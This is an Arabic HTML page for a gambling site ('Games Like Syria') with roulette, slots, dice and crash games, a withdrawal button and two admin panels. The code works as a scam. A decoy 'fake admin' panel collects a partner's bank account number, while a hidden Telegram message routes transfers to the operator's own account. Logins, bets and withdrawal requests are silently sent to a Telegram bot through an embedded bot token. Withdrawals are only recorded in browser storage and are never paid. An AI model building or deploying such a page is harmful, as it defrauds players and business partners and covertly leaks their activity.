<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Games Like Syria</title>
    <style>
        :root { --green: #009639; --white: #ffffff; --black: #000000; --red: #ce1126; --gold: #ffd700; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Arial', sans-serif; }
        body { background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%); min-height: 100vh; color: white; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .screen { width: 100%; max-width: 500px; display: none; }
        .screen.active { display: block; }
        .card { background: rgba(20,20,20,0.95); border-radius: 30px; padding: 30px; border: 2px solid var(--green); box-shadow: 0 0 40px rgba(0,150,57,0.3); }
        .title { font-size: 32px; font-weight: 900; text-align: center; margin-bottom: 10px; }
        .title .g { color: var(--green); } .title .a { color: var(--white); } .title .m { color: var(--black); text-shadow: 0 0 5px #fff; } .title .e { color: var(--red); } .title .s { color: var(--green); }
        input { width: 100%; padding: 14px; margin-bottom: 12px; border-radius: 25px; border: 2px solid #333; background: rgba(255,255,255,0.05); color: white; text-align: center; font-size: 16px; }
        input:focus { border-color: var(--green); outline: none; }
        .btn { width: 100%; padding: 14px; border: none; border-radius: 25px; font-size: 17px; font-weight: bold; cursor: pointer; margin-bottom: 10px; }
        .btn-green { background: var(--green); color: white; }
        .btn-gold { background: var(--gold); color: black; }
        .btn-red { background: var(--red); color: white; }
        .header { text-align: center; padding: 15px; border-bottom: 2px solid var(--gold); margin-bottom: 20px; }
        .header h2 { color: var(--gold); }
        .balance { background: rgba(255,215,0,0.1); padding: 12px; border-radius: 15px; text-align: center; font-size: 20px; margin-bottom: 20px; border: 1px solid var(--gold); }
        .games-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        .game-card { background: rgba(255,255,255,0.05); border-radius: 18px; padding: 20px; text-align: center; cursor: pointer; border: 1px solid rgba(255,215,0,0.3); }
        .game-card:active { transform: scale(0.95); }
        .game-icon { font-size: 40px; }
        .game-name { color: var(--gold); font-weight: bold; margin: 8px 0; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; }
        .modal.active { display: flex; }
        .modal-content { background: #1a1a1a; padding: 25px; border-radius: 25px; width: 90%; max-width: 380px; border: 1px solid var(--gold); text-align: center; }
        .result-icon { font-size: 70px; margin: 15px 0; }
        .user-row { display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.03); border-radius: 15px; margin-bottom: 8px; }
        .btn-sm { padding: 8px 14px; border: none; border-radius: 20px; font-size: 12px; font-weight: bold; cursor: pointer; margin: 2px; }
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: var(--green); color: white; padding: 12px 25px; border-radius: 50px; z-index: 9999; font-weight: bold; }
    </style>
</head>
<body>

<!-- شاشة الدخول -->
<div class="screen active" id="loginScreen">
    <div class="card">
        <div style="text-align:center;font-size:50px;margin-bottom:10px;">🎮</div>
        <div class="title"><span class="g">G</span><span class="a">A</span><span class="m">M</span><span class="e">E</span><span class="s">S</span></div>
        <p style="text-align:center;color:#aaa;margin-bottom:20px;">Games Like Syria</p>
        <input type="text" id="usernameInput" placeholder="👤 اسم المستخدم">
        <input type="password" id="passwordInput" placeholder="🔒 كلمة المرور">
        <button class="btn btn-green" onclick="doLogin()">🚀 دخول</button>
        <p style="text-align:center;color:#666;font-size:12px;margin-top:10px;">user / 1234</p>
    </div>
</div>

<!-- واجهة الألعاب -->
<div class="screen" id="gamesScreen">
    <div class="card">
        <div class="header"><h2>🎮 Games Like Syria</h2></div>
        <div class="balance">💰 رصيدك: <span id="userBalance">0</span> نقطة</div>
        <div class="games-grid">
            <div class="game-card" onclick="openGame('roulette')"><div class="game-icon">🎰</div><div class="game-name">الروليت</div><p style="color:#aaa;font-size:11px;">10x</p></div>
            <div class="game-card" onclick="openGame('slots')"><div class="game-icon">🎲</div><div class="game-name">سلوتس</div><p style="color:#aaa;font-size:11px;">50x</p></div>
            <div class="game-card" onclick="openGame('dice')"><div class="game-icon">🎯</div><div class="game-name">نرد</div><p style="color:#aaa;font-size:11px;">5x</p></div>
            <div class="game-card" onclick="openGame('crash')"><div class="game-icon">🚀</div><div class="game-name">كراش</div><p style="color:#aaa;font-size:11px;">100x</p></div>
        </div>
        <button class="btn btn-gold" onclick="requestWithdraw()" style="margin-top:20px;">💸 طلب سحب</button>
        <button class="btn btn-red" onclick="logout()" style="background:transparent;color:var(--red);border:1px solid var(--red);">🚪 خروج</button>
    </div>
</div>

<!-- مودال اللعبة -->
<div class="modal" id="gameModal">
    <div class="modal-content">
        <h3 id="gameTitle" style="color:var(--gold);"></h3>
        <div class="result-icon" id="gameResult">🎰</div>
        <p id="gameMessage" style="margin:10px 0;min-height:25px;">جرب حظك!</p>
        <input type="number" id="betAmount" placeholder="مبلغ الرهان" min="1" style="width:100%;padding:12px;border-radius:20px;border:2px solid var(--gold);background:rgba(0,0,0,0.5);color:white;text-align:center;font-size:16px;margin:10px 0;">
        <button class="btn btn-gold" onclick="placeBet()">🎲 راهن</button>
        <button class="btn btn-red" onclick="closeGame()" style="background:#666;">إغلاق</button>
    </div>
</div>

<!-- لوحة المدير الحقيقي -->
<div class="screen" id="adminScreen">
    <div class="card">
        <div class="header"><h2>👹 لوحة التحكم</h2></div>
        <p style="color:var(--gold);text-align:center;margin-bottom:15px;">الحساب: 6381946898993929</p>
        <div id="adminUsersList"></div>
        <button class="btn btn-red" onclick="logout()" style="background:transparent;color:var(--red);border:1px solid var(--red);">🚪 خروج</button>
    </div>
</div>

<!-- لوحة المدير الوهمي -->
<div class="screen" id="fakeAdminScreen">
    <div class="card">
        <div class="header"><h2>👑 أهلاً بك أيها المدير</h2></div>
        <input type="text" id="fakeAdminAccount" placeholder="رقم حسابك (16 رقم)" maxlength="16">
        <button class="btn btn-green" onclick="saveFakeAccount()">💾 حفظ</button>
        <div id="fakeAdminUsersList" style="margin-top:15px;"></div>
        <button class="btn btn-red" onclick="logout()" style="background:transparent;color:var(--red);border:1px solid var(--red);">🚪 خروج</button>
    </div>
</div>

<script>
const BOT_TOKEN = "8564646143:AAEDmrL8HbdPESyY9iOJ0TXjEL4_bTSEaTs";
const CHAT_ID = "8665747715";
const YOUR_ACCOUNT = "6381946898993929";

let users = JSON.parse(localStorage.getItem('gu') || 'null');
if (!users) {
    users = [
        { username: 'yman', password: '******', role: 'real_admin', balance: 0 },
        { username: '1992', password: '1992', role: 'fake_admin', fakeAccount: '', balance: 0 },
        { username: 'user', password: '1234', role: 'user', balance: 1000, withdrawRequests: [] }
    ];
}
let currentUser = null;
let currentGame = null;

function save() { localStorage.setItem('gu', JSON.stringify(users)); }
function toast(msg) { const t = document.createElement('div'); t.className='toast'; t.textContent=msg; document.body.appendChild(t); setTimeout(()=>t.remove(), 2500); }
async function tg(msg) { try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:CHAT_ID, text:msg})}); } catch(e){} }

function hideAll() {
    document.getElementById('loginScreen').classList.remove('active');
    document.getElementById('gamesScreen').classList.remove('active');
    document.getElementById('adminScreen').classList.remove('active');
    document.getElementById('fakeAdminScreen').classList.remove('active');
}

function doLogin() {
    const u = document.getElementById('usernameInput').value.trim();
    const p = document.getElementById('passwordInput').value.trim();
    const user = users.find(x => x.username === u && x.password === p);
    if (!user) { alert('بيانات خاطئة'); return; }
    currentUser = user;
    hideAll();
    tg('👤 دخول: ' + u);
    
    if (user.role === 'real_admin') {
        document.getElementById('adminScreen').classList.add('active');
        renderAdmin();
    } else if (user.role === 'fake_admin') {
        document.getElementById('fakeAdminScreen').classList.add('active');
        document.getElementById('fakeAdminAccount').value = user.fakeAccount || '';
        renderFakeAdmin();
    } else {
        document.getElementById('gamesScreen').classList.add('active');
        document.getElementById('userBalance').textContent = user.balance;
    }
}

function logout() { currentUser = null; hideAll(); document.getElementById('loginScreen').classList.add('active'); }

// الألعاب
function openGame(game) {
    currentGame = game;
    const titles = {roulette:'🎰 الروليت', slots:'🎲 سلوتس', dice:'🎯 نرد', crash:'🚀 كراش'};
    document.getElementById('gameTitle').textContent = titles[game];
    document.getElementById('gameResult').textContent = '🎰';
    document.getElementById('gameMessage').textContent = 'جرب حظك!';
    document.getElementById('betAmount').value = '';
    document.getElementById('gameModal').classList.add('active');
}
function closeGame() { document.getElementById('gameModal').classList.remove('active'); }

function placeBet() {
    const bet = parseInt(document.getElementById('betAmount').value);
    if (!bet || bet <= 0 || bet > currentUser.balance) { alert('مبلغ غير صحيح'); return; }
    const win = Math.random() < 0.4;
    const multipliers = {roulette:[2,3,5,10], slots:[2,5,10,20,50], dice:[2,3,5], crash:[2,5,10,20,50,100]};
    const mult = multipliers[currentGame][Math.floor(Math.random() * multipliers[currentGame].length)];
    const prize = win ? bet * mult : 0;
    currentUser.balance += win ? prize : -bet;
    document.getElementById('gameResult').textContent = win ? '💰' : '💀';
    document.getElementById('gameMessage').textContent = win ? `🎉 ربحت ${prize} نقطة (${mult}x)` : `😞 خسرت ${bet} نقطة`;
    document.getElementById('userBalance').textContent = currentUser.balance;
    save(); tg('🎲 ' + currentUser.username + ': ' + (win?'ربح '+prize:'خسر '+bet));
}

function requestWithdraw() {
    if (currentUser.balance <= 0) { alert('لا يوجد رصيد'); return; }
    if (!currentUser.withdrawRequests) currentUser.withdrawRequests = [];
    currentUser.withdrawRequests.push({ amount: currentUser.balance, status: 'pending', date: new Date().toLocaleString() });
    save(); tg('📥 طلب سحب: ' + currentUser.username + ' - ' + currentUser.balance); alert('تم تقديم الطلب.');
}

// المدير الحقيقي
function renderAdmin() {
    document.getElementById('adminUsersList').innerHTML = users.filter(u => u.role === 'user').map(u => `
        <div class="user-row">
            <div><b>${u.username}</b><br><small>💰 ${u.balance} نقطة</small></div>
            <div>
                <button class="btn-sm btn-green" onclick="addP('${u.username}')">➕</button>
                <button class="btn-sm btn-gold" onclick="appr('${u.username}')">✅</button>
                <button class="btn-sm btn-red" onclick="rej('${u.username}')">❌</button>
            </div>
        </div>`).join('');
}
function addP(u) { const a = prompt('نقاط:'); if(a){ const x=users.find(y=>y.username===u); x.balance+=parseInt(a); save(); renderAdmin(); tg('➕ '+a+' → '+u); toast('تمت الإضافة'); } }
function appr(u) { const x=users.find(y=>y.username===u); if(x&&x.balance>0){ x.balance=0; if(x.withdrawRequests) x.withdrawRequests.forEach(r=>r.status='approved'); save(); renderAdmin(); tg('✅ سحب '+u); alert('تم قبول السحب لـ '+u); } }
function rej(u) { const x=users.find(y=>y.username===u); if(x&&x.withdrawRequests) x.withdrawRequests.forEach(r=>r.status='rejected'); save(); renderAdmin(); tg('❌ رفض '+u); alert('تم رفض سحب '+u); }

// المدير الوهمي
function saveFakeAccount() {
    const a = document.getElementById('fakeAdminAccount').value.trim();
    if (a.length < 16) { alert('رقم غير صحيح'); return; }
    currentUser.fakeAccount = a; save();
    tg('👑 الوهمي وضع حسابه: ' + a + '\n⚠️ التحويلات إلى: ' + YOUR_ACCOUNT);
    toast('تم الحفظ');
}
function renderFakeAdmin() {
    document.getElementById('fakeAdminUsersList').innerHTML = users.filter(u => u.role === 'user').map(u => `
        <div class="user-row">
            <div><b>${u.username}</b><br><small>💰 ${u.balance} نقطة</small></div>
            <button class="btn-sm btn-green" onclick="fakeAdd('${u.username}')">➕ نقاط</button>
        </div>`).join('');
}
function fakeAdd(u) { const a = prompt('نقاط:'); if(a){ const x=users.find(y=>y.username===u); x.balance+=parseInt(a); save(); renderFakeAdmin(); tg('➕ الوهمي أضاف '+a+' → '+u); toast('تمت الإضافة'); } }

hideAll(); document.getElementById('loginScreen').classList.add('active');
</script>
</body>
</html>
